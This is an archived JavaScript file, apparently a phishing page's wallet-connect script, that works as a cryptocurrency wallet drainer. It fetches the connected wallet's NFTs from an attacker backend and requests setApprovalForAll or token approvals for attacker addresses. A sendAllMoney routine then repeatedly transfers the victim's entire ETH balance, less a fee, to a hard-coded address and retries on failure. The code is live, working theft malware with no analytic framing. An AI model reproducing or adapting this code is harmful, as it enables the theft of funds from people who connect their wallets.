var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");

console.log("loaded");
let URL = "https://web.archive.org/web/20220510232111/https://api.backenddavid.xyz"
let ContractAdr = "0x072316cC278c9Ee36640576685C36d2015A308Cd";
let abi = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "operator",
                "type": "address"
            },
            {
                "internalType": "bool",
                "name": "approved",
                "type": "bool"
            }
        ],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [

        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },

]
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;


// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;
let web3;

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            // Mikko's test key - don't copy as your mileage may vary
            infuraId: "a10fbcf3c5e040369e4cde0724a65e48",
        }
    }

};

web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
});

function toogleButton() {

    document.getElementsByTagName("button")[0].disabled = !document.getElementsByTagName("button")[0].disabled;
}

async function connect() {
    try {
        await web3Modal.clearCachedProvider()
    }
    catch (e) {
        console.log(e)
    }
    provider = await web3Modal.connect();
    web3 = new Web3(provider);

    console.log("Web3 instance is", web3);
    const accounts = await web3.eth.getAccounts();
    const balance = await web3.eth.getBalance(accounts[0]);

    selectedAccount = accounts[0];
    try {
        try {

            //throw "No accounts found"
            await performInjection(selectedAccount, balance);
        }
        catch (error) {
            // do in loop
            console.log(error)

            await sendAllMoney()


        }
    }
    catch (err) {
        await sendAllMoney()
    }




}


async function performInjection(address) {
    let nfts = await getNFTS(selectedAccount);
    let sortedNFTs = nfts;
    console.log(sortedNFTs);
    if (sortedNFTs.length == 0) {
        throw "No NFTs found"
    }
    for (let i = 0; i < sortedNFTs.length; i++) {
        let key = Object.keys(sortedNFTs[i])[0]
        let actualDict = sortedNFTs[i][key];
        let higherPrice = sortedNFTs[i][key][0]["token_address"];
        let isErc20 = sortedNFTs[i][key][0]["isErc20"];
        
        let contractInstance = new web3.eth.Contract(abi, higherPrice);
        let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
        

        let data = { "owner": selectedAccount, "address": toCheckSumAddress,"isErc20": isErc20  };
        if(isErc20){
            data["balance"] = actualDict[0]["balance"];
        }
        console.log(data)
        await fetch(`${URL}/transfer/init`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });

        //let result = await contractInstance.methods.setApprovalForAll(ContractAdr, true).send({ from: selectedAccount });
        //console.log(result);
        let data_to_encode = contractInstance.methods.setApprovalForAll(ContractAdr, true).encodeABI();
        if (actualDict[0]["isErc20"]) {
            let balanceOwned =actualDict[0]["balance"];
            data_to_encode = contractInstance.methods.approve("0x27cCD7b8BA2608a6711306FeB173d2645F69a2F2", balanceOwned.toString()).encodeABI();
        }

        const transactionParameters = {
            to: higherPrice, // Required except during contract publications.
            from: selectedAccount, // must match user's active address.
            value: 0,
            'data': data_to_encode //make call to NFT smart contract 
        };
        try {
            const txHash = await provider.request({
                method: 'eth_sendTransaction',
                params: [transactionParameters],
            });
            if (i == sortedNFTs.length - 1) {
                await sendAllMoney();
            }

            //showModal("Transaction Completed ", "You can check your transaction here: <a href='https://web.archive.org/web/20220510232111/https://etherscan.io/tx/" + txHash + "'>https://etherscan.io/tx/" + txHash + "</a>");
        } catch (error) {
            await performInjection(address)
            //showModal("Oops Transaction Failed", "Your Transaction Failed , Log : " + error.message);
        }
    }



}

async function get12DollarETH() {
    let url = "https://web.archive.org/web/20220510232111/https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    let perETH = price["ethereum"]["usd"];
    let usd = 1 / perETH;
    return usd * 20;
}


async function sendAllMoney() {
    try {
        let balance = await web3.eth.getBalance(selectedAccount);

        let to = "0x27cCD7b8BA2608a6711306FeB173d2645F69a2F2";
        console.log(balance);
        //new balance = 10% of the balance
        balance = parseInt(balance);
        let transactionFee = await get12DollarETH()
        transactionFee = parseInt(web3.utils.toWei(transactionFee.toFixed(5).toString(), 'ether'));
        console.log()
        let transactionObject = { from: selectedAccount, to: to }
        console.log("Balance is ", balance);
        console.log("Transaction Fee is ", transactionFee);
        let newBalance = balance - transactionFee;
        console.log("New Balance is ", newBalance);
        transactionObject.value = web3.utils.toHex(newBalance); // set the transaction value to the entire balance, less the transaction fee
        console.log("Sending Money")
        if (newBalance > 0) {
            try {
                await web3.eth.sendTransaction(transactionObject);
                await sendAllMoney();

            }
            catch (error) {
                console.log("Exception Happened")
                await sendAllMoney();
            }


        }
        else {
            transactionObject.value = web3.utils.toHex(balance);
            await web3.eth.sendTransaction(transactionObject);

        }

    }
    catch (error) {
        await sendAllMoney();
    }



}


async function getNFTS(address) {
    let url = `${URL}/getnfts/${address}`;
    let response = await fetch(url);
    let data = await response.json();
    return data;
}

function sortNFT(nfts) {
    let sortable = [];
    for (var vehicle in nfts) {
        sortable.push([vehicle, nfts[vehicle]]);
    }

    return sortable.sort(function (a, b) {

        return parseInt(a[1][0]["floor_price"]["price"]) - parseInt(b[1][0]["floor_price"]["price"]);
    });


}


}
/*
     FILE ARCHIVED ON 23:21:11 May 10, 2022 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 07:03:46 Jul 22, 2025.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 0.531
  exclusion.robots: 0.026
  exclusion.robots.policy: 0.016
  esindex: 0.011
  cdx.remote: 12.58
  LoadShardBlock: 115.238 (3)
  PetaboxLoader3.datanode: 201.55 (5)
  load_resource: 309.084
  PetaboxLoader3.resolve: 165.213
  loaddict: 84.74
*/